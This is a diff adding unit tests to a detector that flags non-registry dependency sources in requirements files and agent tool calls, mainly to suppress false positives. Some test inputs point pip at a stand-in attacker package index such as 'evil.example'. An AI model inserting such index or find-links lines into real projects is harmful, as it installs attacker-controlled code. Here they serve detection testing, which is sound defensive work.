@@ -112,3 +112,68 @@ def test_mcp_write_of_malicious_manifest_flagged():
     plain = dg.analyze(AnalysisInput(content="git clone https://github.com/some/repo.git && make",
                                      subject="MCP", surface=Surface.MCP))
     assert plain == []
+
+
+# --- false positives read off the live console (2026-10-01) -------------------------------
+
+def _tool_call(args_text, tool="Bash", resource="", server=""):
+    """An agent tool call as the ingest endpoint builds it: scanned text is the arguments plus
+    the resource, the structured pieces ride in metadata."""
+    content = "\n".join(p for p in (args_text, resource) if p)
+    return dep_guard.DepGuardDetector().analyze(AnalysisInput(
+        content=content, subject=f"Agent tool: {tool}", channel=tool,
+        surface=Surface.MCP if server else Surface.AGENT_TOOLS,
+        metadata={"tool": tool, "server": server, "args_text": args_text, "resource": resource}))
+
+
+def _non_registry(sigs):
+    return [s for s in sigs if "non-registry" in s.title.lower()]
+
+
+def test_pip_options_that_name_no_source_are_not_non_registry_dependencies():
+    """`line.startswith("--")` was meant to catch --index-url, and caught every line that
+    began with two dashes: --hash=, --require-hashes, --no-binary, and a markdown `---`.
+    One Bash command with twelve `---` lines produced twelve "Non-registry dependency source"
+    signals, which together scored a harmless command a perfect 100."""
+    reqs = ("--require-hashes\nrequests==2.31.0 \\\n    --hash=sha256:abc123\n---\n"
+            "--no-binary :all:\n--pre\n")
+    assert _non_registry(_scan(reqs, subject="requirements.txt")) == []
+
+
+def test_pip_options_that_name_a_source_still_flag():
+    for line in ("--index-url https://evil.example/simple",
+                 "--extra-index-url=https://evil.example/simple",
+                 "-i https://evil.example/simple",
+                 "-f https://evil.example/wheels",
+                 "--find-links=./vendor",
+                 "-e git+https://x/y.git#egg=z",
+                 "--editable ./local-pkg"):
+        sigs = _scan(f"requests==2.31.0\n{line}\n", subject="requirements.txt")
+        assert _non_registry(sigs), line
+
+
+def test_a_repeated_requirement_line_is_one_signal():
+    """Identical signals each add weight; twelve of the same line must not outweigh one."""
+    reqs = "-e git+https://x/y.git#egg=z\n" * 12
+    assert len(_non_registry(_scan(reqs, subject="requirements.txt"))) == 1
+
+
+def test_a_command_that_merely_mentions_requirements_txt_is_not_a_manifest():
+    """Any tool call whose text contained the word `requirements.txt` had every line read as
+    a requirement, so a shell command became a manifest and `/abs/path`, `./script` and
+    `https://…` lines each read as a non-registry dependency."""
+    cmd = ("pip install -r requirements.txt && cat <<'EOF' > notes.md\n---\ntitle: build\n---\n"
+           "/home/dev/app/dist\n./scripts/run.sh\nhttps://example.com/docs\nEOF")
+    assert _non_registry(_tool_call(cmd)) == []
+    assert _tool_call("git add backend/requirements.txt && git commit -m 'pin deps'") == []
+
+
+def test_writing_a_requirements_file_through_a_tool_is_still_scanned():
+    """Recall: a Write/Edit names the file as its resource and leads its arguments with the
+    path (as it does for package.json); an MCP filesystem server leads with the path too."""
+    body = "requests==2.31.0\n-e git+https://x/y.git#egg=z\n"
+    path = "/proj/requirements.txt"
+    assert _non_registry(_tool_call(f"{path}\n{body}", tool="Write", resource=path))
+    assert _non_registry(_tool_call(f"{path}\n{body}", tool="write_file", server="fs"))
+    # the path line itself is a path, not a dependency
+    assert _non_registry(_tool_call(f"{path}\nrequests==2.31.0\n", tool="Write", resource=path)) == []
